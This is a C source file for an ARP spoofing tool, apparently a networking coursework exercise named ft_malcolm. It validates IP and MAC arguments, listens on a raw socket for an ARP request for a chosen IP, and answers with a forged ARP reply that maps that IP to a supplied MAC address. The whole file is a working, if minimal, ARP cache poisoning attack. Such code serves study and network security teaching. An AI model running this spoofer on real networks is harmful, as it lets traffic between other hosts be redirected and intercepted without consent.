#include "../libft/libft.h"

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <net/if.h>
#include <netinet/if_ether.h>
#include <netpacket/packet.h>
#include <sys/socket.h>
#include <netdb.h>
#include <ifaddrs.h>


typedef in_addr_t           Addr;
typedef struct in_addr      InAddr;
typedef struct addrinfo     AddrInfo;
typedef struct sockaddr     SockAddr;
typedef struct sockaddr_in  Sockaddr_in;
typedef struct sockaddr_ll  Sockaddr_ll;
typedef struct ifaddrs     IfAddrs;
typedef struct ethhdr       EthHdr;
typedef struct ether_arp    EtherArp;

#define BUFF_SIZE 1024

#define MAC_ADDR_SIZE 18

#define ARP_REPLY_PACKET_SIZE (sizeof(EthHdr) + sizeof(EtherArp))

typedef struct MalcolmSender {
    int         sock;
    Sockaddr_ll addr_ll;
} MalcolmSender;

typedef struct MalcolmCtx {
    MalcolmSender   sender;
    int             sock;
    Addr            src_ip;
    u8              src_mac[ETH_ALEN];
    Addr            target_ip;
    u8              target_mac[ETH_ALEN];
    u8              arp_reply_packet[ARP_REPLY_PACKET_SIZE];
} MalcolmCtx;

typedef struct StatusIffAddr {
    u32     flag;
    char    *name;
} StatusIffAddr;

#define IFF_FLAGS_ARR (StatusIffAddr[]) {\
    { IFF_UP, "IFF_UP" },\
    { IFF_BROADCAST, "IFF_BROADCAST" },\
    { IFF_DEBUG, "IFF_DEBUG" },\
    { IFF_LOOPBACK, "IFF_LOOPBACK" },\
    { IFF_POINTOPOINT, "IFF_POINTOPOINT" },\
    { IFF_NOTRAILERS, "IFF_NOTRAILERS" },\
    { IFF_RUNNING, "IFF_RUNNING" },\
    { IFF_NOARP, "IFF_NOARP" },\
    { IFF_PROMISC, "IFF_PROMISC" },\
    { IFF_ALLMULTI, "IFF_ALLMULTI" },\
    { IFF_MASTER, "IFF_MASTER" },\
    { IFF_SLAVE, "IFF_SLAVE" },\
    { IFF_MULTICAST, "IFF_MULTICAST" },\
    { IFF_PORTSEL, "IFF_PORTSEL" },\
    { IFF_AUTOMEDIA, "IFF_AUTOMEDIA" },\
    { IFF_DYNAMIC, "IFF_DYNAMIC" },\
    { 0, NULL }\
};

void get_mac_addr(unsigned char *mac, char *buf) {
    sprintf(buf, "%02x:%02x:%02x:%02x:%02x:%02x",
            mac[0], mac[1], mac[2],
            mac[3], mac[4], mac[5]);
}

void dbg_display_arp_packet(const unsigned char *buffer, ssize_t len) {

        // DBG("Packet received, length: %zd bytes\n\n", len);

        EthHdr *eth = (EthHdr *) buffer;
        (void)len;
        if (ntohs(eth->h_proto) == ETH_P_ARP) {

            DBG("=== Ethernet Header ===\n\n");

            char dest_mac[32] = {};
            char src_mac[32] = {};
            get_mac_addr(eth->h_dest, dest_mac);
            get_mac_addr(eth->h_source, src_mac);

            DBG("\tDestination MAC : %s\n", dest_mac);
            DBG("\tSource MAC      : %s\n", src_mac);
            DBG("\tProtocol (hex)  : 0x%04x\n\n", ntohs(eth->h_proto));
            DBG("Received ARP packet, protocol: 0x%04x\n", ntohs(eth->h_proto));

            EtherArp *arp = (EtherArp *)(buffer + sizeof(EthHdr));
            DBG("=== ARP Header ===\n");
            DBG("\tHardware type   : %u\n", ntohs(arp->ea_hdr.ar_hrd));
            DBG("\tProtocol type   : 0x%04x\n", ntohs(arp->ea_hdr.ar_pro));
            DBG("\tHW size         : %u\n", arp->ea_hdr.ar_hln);
            DBG("\tProtocol size   : %u\n", arp->ea_hdr.ar_pln);
            DBG("\tOpcode          : %u (%s)\n",
                   ntohs(arp->ea_hdr.ar_op),
                   (ntohs(arp->ea_hdr.ar_op) == ARPOP_REQUEST) ? "request" :
                   (ntohs(arp->ea_hdr.ar_op) == ARPOP_REPLY)   ? "reply"   : "other");


            char sender_ip[INET_ADDRSTRLEN];
            char target_ip[INET_ADDRSTRLEN];
            inet_ntop(AF_INET, arp->arp_spa, sender_ip, sizeof(sender_ip));
            inet_ntop(AF_INET, arp->arp_tpa, target_ip, sizeof(target_ip));


            char s_mac[32] = {};
            char t_mac[32] = {};
            get_mac_addr(arp->arp_sha, s_mac);
            get_mac_addr(arp->arp_tha, t_mac);

            DBG("\tSender MAC      : %s\n", s_mac);
            DBG("\tSender IP       : %s\n", sender_ip);
            DBG("\tTarget MAC      : %s\n", t_mac);
            DBG("\tTarget IP       : %s\n", target_ip);

            if (ntohs(arp->ea_hdr.ar_op) == ARPOP_REQUEST) {
                DBG("ARP Request: Who has %s? Tell %s\n", target_ip, sender_ip);
            }
        } 
}

s8 is_match_request(MalcolmCtx *c, unsigned char *arp_spa, unsigned char *arp_tpa, char *s_mac) {
    // if (*(Addr *)arp_spa == c->target_ip && *(Addr *)arp_tpa == c->src_ip &&
    //     ft_strcmp(s_mac, c->target_mac_str) == 0) 
    // set_log_level(L_WARN);

    (void)s_mac;

    char *tpa = ft_strdup(inet_ntoa(*(InAddr *)arp_tpa));
    char *spa = ft_strdup(inet_ntoa(*(InAddr *)arp_spa));
    INFO("Received ARP Request: Who has %s? Tell %s\n", tpa, spa);
    free(tpa);
    free(spa);

    if (*(Addr *)arp_tpa == c->src_ip) {
        return (TRUE);
    }
    return (FALSE);
}

u8 hex_byte_to_bin(char c) {
    if (c >= '0' && c <= '9') {
        return (c - '0');
    } else if (c >= 'a' && c <= 'f') {
        return (c - 'a' + 10);
    } else if (c >= 'A' && c <= 'F') {
        return (c - 'A' + 10);
    } else {
        return (0);
    }
}

void mac_addr_str_to_bytes(const char *mac_str, unsigned char *mac_bytes) {
    for (int i = 0; i < 6; i++) {
        u8 byte = hex_byte_to_bin(mac_str[i * 3]);
        mac_bytes[i] = (byte << 4) | hex_byte_to_bin(mac_str[i * 3 + 1]);
    }

    DBG("Converted MAC string %s\n", mac_str);
    DBG(" to bytes %02x:%02x:%02x:%02x:%02x:%02x\n",
         mac_bytes[0], mac_bytes[1], mac_bytes[2],
         mac_bytes[3], mac_bytes[4], mac_bytes[5]);

}

void init_malcolm_sender(MalcolmSender *sender, const char* interface_name ) {
    sender->sock = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ALL));
    if (sender->sock == -1) {
        perror("socket");
        exit(EXIT_FAILURE);
    }
    DBG("Successfully opened socket: %i\n", sender->sock);

    u32 ifindex = if_nametoindex(interface_name);
    if (ifindex == 0) {
        perror("if_nametoindex");
        close(sender->sock);
        exit(EXIT_FAILURE);
    }
    DBG("Successfully got interface index: %i\n", ifindex);

    memset(&sender->addr_ll, 0, sizeof(sender->addr_ll));
    sender->addr_ll.sll_family = AF_PACKET;
    sender->addr_ll.sll_protocol = htons(ETH_P_ALL);
    sender->addr_ll.sll_ifindex = ifindex;
    sender->addr_ll.sll_hatype = ARPHRD_ETHER;
    sender->addr_ll.sll_pkttype = PACKET_OUTGOING;
    sender->addr_ll.sll_halen = ETH_ALEN;
    DBG("Initialized MalcolmSender on device %s\n", interface_name);
}

int send_raw_packet(MalcolmCtx *c) {

    memcpy(c->sender.addr_ll.sll_addr, c->src_mac, ETH_ALEN);

    errno = 0;

    ssize_t bytes_sent = sendto(c->sender.sock, c->arp_reply_packet, ARP_REPLY_PACKET_SIZE, 0, (SockAddr*)&c->sender.addr_ll, sizeof(c->sender.addr_ll));
    if (bytes_sent == -1) {
        perror("sendto");
        return -1;
    }
    
    INFO("Packet sent successfully: %zd bytes\n", bytes_sent);
    return 0;
}

void build_packet(MalcolmCtx *c, unsigned char *buff) {
    // build response packet
    EthHdr eth_resp;


    memcpy(eth_resp.h_dest, c->target_mac, ETH_ALEN);
    memcpy(eth_resp.h_source, c->src_mac, ETH_ALEN);

    eth_resp.h_proto = htons(ETH_P_ARP);

    EtherArp arp_hdr_resp;
    arp_hdr_resp.ea_hdr.ar_hrd = htons(ARPHRD_ETHER);
    arp_hdr_resp.ea_hdr.ar_pro = htons(ETH_P_IP);
    arp_hdr_resp.ea_hdr.ar_hln = ETH_ALEN;
    arp_hdr_resp.ea_hdr.ar_pln = 4;
    arp_hdr_resp.ea_hdr.ar_op = htons(ARPOP_REPLY);
   
    memcpy(arp_hdr_resp.arp_spa, &c->src_ip, 4);
    memcpy(arp_hdr_resp.arp_tpa, &c->target_ip, 4);

    memcpy(arp_hdr_resp.arp_tha, c->target_mac, ETH_ALEN);

    memcpy(arp_hdr_resp.arp_sha, c->src_mac, ETH_ALEN);


    DBG(YELLOW"=== ARP Reply Packet BUILD ===\n"RESET);
    // unsigned char buff[BUFF_SIZE] = {};
    memcpy(buff, &eth_resp, sizeof(EthHdr));
    memcpy(buff + sizeof(EthHdr), &arp_hdr_resp, sizeof(EtherArp));
    DBG("-----------------------------------------------------------------------------------------------\n");
    dbg_display_arp_packet(buff, sizeof(EthHdr) + sizeof(EtherArp));
    DBG("-----------------------------------------------------------------------------------------------\n");

}

void listen_arp_request(MalcolmCtx *c, const unsigned char *buffer, ssize_t len) {

    (void)len;

    EthHdr *eth = (EthHdr *) buffer;

    int is_arp = (ntohs(eth->h_proto) == ETH_P_ARP);

    if (!is_arp) {
        DBG("Not an ARP packet, protocol: 0x%04x\n", ntohs(eth->h_proto));
        return;
    }

    EtherArp arp_hdr = *(EtherArp *)(buffer + sizeof(EthHdr));

    int packet_type = ntohs(arp_hdr.ea_hdr.ar_op) == ARPOP_REQUEST ? ARPOP_REQUEST : ntohs(arp_hdr.ea_hdr.ar_op) == ARPOP_REPLY ? ARPOP_REPLY : -1;


    // char sender_ip[INET_ADDRSTRLEN];
    char target_ip[INET_ADDRSTRLEN];

    // inet_ntop(AF_INET, arp_hdr.arp_spa, sender_ip, sizeof(sender_ip));
    inet_ntop(AF_INET, arp_hdr.arp_tpa, target_ip, sizeof(target_ip));

    
    char s_mac[32] = {};
    get_mac_addr(arp_hdr.arp_sha, s_mac);

    if (packet_type == ARPOP_REQUEST) {
        if (is_match_request(c, arp_hdr.arp_spa, arp_hdr.arp_tpa, s_mac)) {
            DBG(GREEN"*** Matched ARP packet ***\n\n"RESET);

            DBG(YELLOW"=== SENDING ARP Reply Packet ===\n"RESET);
            // int sent_bool = send_raw_packet(interface_name, c->arp_reply_packet, sizeof(EthHdr) + sizeof(EtherArp), c->src_mac);
            int sent_bool = send_raw_packet(c);
            DBG("Sent bool %d\n", sent_bool);

            exit(0);
        } else {
            DBG("Src IP: %d, Ctx Src IP: %d\n", *(Addr*)arp_hdr.arp_spa, c->target_ip);
            DBG("Target IP: %d, Ctx Target IP: %d\n", *(Addr*)arp_hdr.arp_tpa, c->src_ip);
            DBG("ARP packet does not match context\n\n");
        }
    }
}


void listen_arp(MalcolmCtx *c) {
    char buffer[BUFF_SIZE] = {}; /*Buffer for Ethernet Frame*/


    DBG("Server started, entering initialiation phase...\n");

    errno = 0;
    c->sock = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ALL));
    if (c->sock == -1) {
        perror("socket:");
        exit(1);
    }
    DBG("Successfully opened socket: %i\n", c->sock);

    INFO("Starting ARP listener...\n");

    while (1) {
        errno = 0;
        ssize_t length = recvfrom(c->sock, buffer, BUFF_SIZE, 0, NULL, NULL);
        if (length == -1) {
            perror("recvfrom:");
            exit(1);
        }
        
        DBG("Received packet of length: %ld\n", length);
        DBG("-----------------------------------------------------------------------------------------------\n");
        dbg_display_arp_packet((unsigned char *)buffer, length);
        DBG("-----------------------------------------------------------------------------------------------\n");

        listen_arp_request(c, (unsigned char *)buffer, length);
        ft_bzero(buffer, BUFF_SIZE);
    }
}


void display_iff_flag(u32 flag) {
    char buffer[1024] = {};
    int idx = 0;

    StatusIffAddr iff_flag_array[] = IFF_FLAGS_ARR;

    for (int i = 0; iff_flag_array[i].flag != 0; i++) {
        if (flag & iff_flag_array[i].flag) {
            idx += sprintf(buffer + idx, " %s", iff_flag_array[i].name);
        }
    }
    DBG("FLAG: %s\n", buffer);
}

s8 is_broadcast_if(u32 flag) {
    return (flag & IFF_BROADCAST);
}

s8 is_loopback_if(u32 flag) {
    return (flag & IFF_LOOPBACK);
}

s8 is_up_if(u32 flag) {
    return (flag & IFF_UP);
}


void display_ifaddrs(IfAddrs *ifa) {
    
    DBG("--------------------------------------------------------------------------------------\n");
    

    if (ifa->ifa_addr->sa_family == AF_INET) {
        Sockaddr_in *addr = (Sockaddr_in *)ifa->ifa_addr;
        char ip[INET_ADDRSTRLEN];
        inet_ntop(AF_INET, &addr->sin_addr, ip, sizeof(ip));
        DBG("Interface: %s, Address: %s\n", ifa->ifa_name, ip);
        DBG("Flags: 0x%x\n", ifa->ifa_flags);
        display_iff_flag(ifa->ifa_flags);
        if (ifa->ifa_netmask) {
            Sockaddr_in *netmask = (Sockaddr_in *)ifa->ifa_netmask;
            char nm[INET_ADDRSTRLEN];
            inet_ntop(AF_INET, &netmask->sin_addr, nm, sizeof(nm));
            DBG("Netmask: %s\n", nm);
        }
        if (ifa->ifa_broadaddr) {
            Sockaddr_in *broadaddr = (Sockaddr_in *)ifa->ifa_broadaddr;
            char ba[INET_ADDRSTRLEN];
            inet_ntop(AF_INET, &broadaddr->sin_addr, ba, sizeof(ba));
            DBG("Broadcast Address: %s\n", ba); 
        }
    }
}

/**
 *	@brief Get process ipv4 address
 *	@return in_addr_t ipv4 address of the process
*/
s8 get_interface_name(char *interface_name) {
    IfAddrs *ifa_head, *current;

    errno = 0;
    if (getifaddrs(&ifa_head) == -1) {
        perror("getifaddrs");
        return (0);
    }

    for (current = ifa_head; current != NULL; current = current->ifa_next) {
        if (current->ifa_addr && current->ifa_addr->sa_family == AF_INET) {
            display_ifaddrs(current);
            if (is_up_if(current->ifa_flags) && is_broadcast_if(current->ifa_flags) && !is_loopback_if(current->ifa_flags)) {
                INFO("Listening on interface: %s\n", current->ifa_name);
                ft_strlcpy(interface_name, current->ifa_name, ft_strlen(current->ifa_name) + 1);
                break;
            }
        }
    }
    DBG("--------------------------------------------------------------------------------------\n");
    freeifaddrs(ifa_head);
    return (1);
}


/* Ip address string format to bin format */
Addr ipv4_str_toaddr(char *str) {
    InAddr addr;

    /* Convert presentation format to binary network format */
    if (inet_pton(AF_INET, str, &addr) <= 0) {
        return (0);
    }
    return (addr.s_addr);
}

/**
 *	@brief Get ipv4 address from hostname
 *	@param hostname hostname to convert
 *	@return ipv4 address
*/
Addr hostname_to_ipv4_addr(char *hostname) {
    AddrInfo hints = {0};
    AddrInfo *result = NULL;
    Sockaddr_in *sockaddr_ipv4;
    Addr addr = 0;

    /* Initialize hints structure */
    hints.ai_family = AF_INET;
    hints.ai_socktype = SOCK_STREAM;

    /* Resolve hostname to IP address */
    int status = getaddrinfo(hostname, NULL, &hints, &result);
    if (status != 0) {
        WARN("getaddrinfo error for %s: %s\n", hostname, gai_strerror(status));
        return (0);
    }

    /* Extract IPv4 address from first result */
    if (result && result->ai_family == AF_INET) {
        sockaddr_ipv4 = (Sockaddr_in *)result->ai_addr;
        addr = sockaddr_ipv4->sin_addr.s_addr;
    }

    /* Free the allocated memory */
    freeaddrinfo(result);
    return (addr);
}

/**
 *	@Brief get destination address
 *	@param dest_str destination address string (ipv4 or hostname) [input]
 *	@param dest_addr pointer on destination address [output]
*/
s8 is_ipv4_addr(char *dest_str, Addr *dest_addr) {
	/* get ipv4 address of destination addr */
	*dest_addr = ipv4_str_toaddr(dest_str);
    #ifdef MALCOLM_BONUS
        if (*dest_addr == 0) {
            *dest_addr = hostname_to_ipv4_addr(dest_str);
            if (*dest_addr == 0) {
                WARN( "'%s' Name or service not known\n", dest_str);
                return (FALSE);
            }
        }
    #else
        if (*dest_addr == 0) {
            WARN( "'%s' Invalid IP address format\n", dest_str);
            return (FALSE);
        }
    #endif
	return (TRUE);
}

s8 is_hexa_char(char c) {
    return ((c >= '0' && c <= '9') || (c >= 'a' && c <= 'f') || (c >= 'A' && c <= 'F'));
}

s8 is_mac_addr(char *mac) {

    int count_colon = count_char(mac, ':');

    if (count_colon != 5) {
        DBG("MAC address must have 5 colons\n");
        return (FALSE);
    }

    char **splited = ft_split((char *)mac, ':');
    if (!splited)
        return (FALSE);

    if (double_char_size(splited) != 6) {
        DBG("MAC address must have 6 octets\n");
        free_double_char(splited);
        return (FALSE);
    }

    for (int i = 0; i < 6; i++) {
        if (ft_strlen(splited[i]) != 2) {
            DBG("MAC address octet %d must be 2 characters\n", i + 1);
            free_double_char(splited);
            return (FALSE);
        }
        if (!is_hexa_char(splited[i][0]) || !is_hexa_char(splited[i][1])) {
            DBG("MAC address octet %d must be hexadecimal\n", i + 1);
            free_double_char(splited);
            return (FALSE);
        }
    }
    free_double_char(splited);
    return (TRUE);
}

void test_mac_addr_func() {

    char *valid_mac = "01:23:45:67:89:ab";
    char *invalid_mac1 = "01:23:45:67:89";        // Too few octets
    char *invalid_mac2 = "01:23:45:67:89:gh";     // Invalid hex character
    char *invalid_mac3 = "01:23:45:67:89:ab:cd";  // Too many octets
    char *invalid_mac4 = "01-23-45-67-89-ab";     // Wrong delimiter
    char *invalid_mac5 = "0123:45:67:89:ab";    // Octet too long
    char *invalid_mac6 = "01:2:45:67:89:ab";     // Octet too short

    INFO("Testing valid MAC address '%s': %s\n", valid_mac, is_mac_addr(valid_mac) ? GREEN"Valid"RESET : RED"Invalid"RESET);
    INFO("Testing invalid MAC address '%s': %s\n", invalid_mac1, is_mac_addr(invalid_mac1) ? GREEN"Valid"RESET : RED"Invalid"RESET);
    INFO("Testing invalid MAC address '%s': %s\n", invalid_mac2, is_mac_addr(invalid_mac2) ? GREEN"Valid"RESET : RED"Invalid"RESET);
    INFO("Testing invalid MAC address '%s': %s\n", invalid_mac3, is_mac_addr(invalid_mac3) ? GREEN"Valid"RESET : RED"Invalid"RESET);
    INFO("Testing invalid MAC address '%s': %s\n", invalid_mac4, is_mac_addr(invalid_mac4) ? GREEN"Valid"RESET : RED"Invalid"RESET);
    INFO("Testing invalid MAC address '%s': %s\n", invalid_mac5, is_mac_addr(invalid_mac5) ? GREEN"Valid"RESET : RED"Invalid"RESET);
    INFO("Testing invalid MAC address '%s': %s\n", invalid_mac6, is_mac_addr(invalid_mac6) ? GREEN"Valid"RESET : RED"Invalid"RESET);

}

void parse_input(MalcolmCtx *c, char **argv) {
    void *dst = NULL;
    
    for (int i = 1; i < 5; i++) {
        DBG("Argument %d: %s\n", i, argv[i]);
        if (i == 1 || i == 3) {
            dst = i == 1 ? &c->src_ip : &c->target_ip;
            if (!is_ipv4_addr(argv[i], dst)) {
                ERR("Invalid IPv4 address: (%s)\n", argv[i]);
                exit(EXIT_FAILURE);
            }
        } else {
            if (!is_mac_addr(argv[i])) {
                ERR("Invalid MAC address: (%s)\n", argv[i]);
                exit(EXIT_FAILURE);
            }
            dst = i == 2 ? c->src_mac : c->target_mac;
            mac_addr_str_to_bytes(argv[i], dst);
        }
    }


}

void display_ctx(MalcolmCtx *c) {
    char src_ip_str[INET_ADDRSTRLEN];
    char target_ip_str[INET_ADDRSTRLEN];

    inet_ntop(AF_INET, &c->src_ip, src_ip_str, sizeof(src_ip_str));
    inet_ntop(AF_INET, &c->target_ip, target_ip_str, sizeof(target_ip_str));

    INFO("Context:\n");
    INFO("  Source IP   : %s\n", src_ip_str);
    INFO("  Target IP   : %s\n", target_ip_str);
    
    INFO("  Source MAC  : %02x:%02x:%02x:%02x:%02x:%02x\n",
        c->src_mac[0], c->src_mac[1], c->src_mac[2],
        c->src_mac[3], c->src_mac[4], c->src_mac[5]);
        
    INFO("  Target MAC  : %02x:%02x:%02x:%02x:%02x:%02x\n\n",
        c->target_mac[0], c->target_mac[1], c->target_mac[2],
        c->target_mac[3], c->target_mac[4], c->target_mac[5]);
}
        
void ft_malcolm(MalcolmCtx *c) {
    char interface_name[BUFF_SIZE] = {};
    s8 ret = get_interface_name(interface_name);
    if (!ret) {
        ERR("Failed to get network interface\n");
        exit(EXIT_FAILURE);
    }

    INFO("Using interface: %s\n", interface_name);
    build_packet(c, c->arp_reply_packet);
    init_malcolm_sender(&c->sender, interface_name);

    listen_arp(c);
}

int main(int argc, char **argv) {
    MalcolmCtx ctx = {0};

    set_log_level(L_INFO);

    if (argc != 5) {
        ERR("Usage: %s <source ip> <source mac> <target ip> <target mac>\n", argv[0]);
        exit(EXIT_FAILURE);
    }
    
    parse_input(&ctx, argv);
    display_ctx(&ctx);
    ft_malcolm(&ctx);
    return (0);
}
